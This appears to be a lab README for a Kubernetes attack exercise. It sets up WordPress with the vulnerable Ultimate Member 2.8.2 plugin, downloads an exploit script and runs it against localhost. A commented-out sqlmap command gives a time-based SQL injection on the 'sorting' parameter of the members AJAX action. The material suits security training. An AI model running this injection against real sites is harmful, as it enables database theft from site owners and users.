# Setup

```bash
kubectl apply -f https://k8s.adriansoftware.de/attacks/08/setup.yaml

# find wordpress* pod grep
ID=$(kubectl get pods -o wide | grep wordpress | awk '{print $1}')
# exec into container and run
kubectl exec -it $ID -- /bin/bash
### in shell:
apt update && apt install unzip -y
curl -o /tmp/ultimate-member.zip https://downloads.wordpress.org/plugin/ultimate-member.2.8.2.zip \
    && unzip /tmp/ultimate-member.zip -d /var/www/html/wp-content/plugins/ \
    && rm /tmp/ultimate-member.zip
### out

sudo apt install sqlmap -y

curl https://k8s.adriansoftware.de/attacks/08/exploit.py -o exploit8.py

sudo apt update
sudo apt install python3-pip -y
python3 -m pip install pystyle --break-system-packages
```

open browser got ot <master_ip>:30080
-> plugins -> Activate Ultimate Member plugin -> plugin click "create pages"

http://master_ip:30080/wp-admin/admin.php?page=um_options&tab=misc
Activate "Enable the use of a custom table for account metadata" option in Ultimate Member > Misc -> "Run" -> Save Changes

# Attack

```bash

python3 exploit8.py -f http://localhost:30080
# sqlmap...
```

<!-- #sqlmap -u http://localhost:30080/wp-admin/admin-ajax.php --method POST --data "action=um_get_members&nonce=c824ca546c&directory_id=b9238&sorting=user_login" --dbms mysql --technique=T -p sorting -->
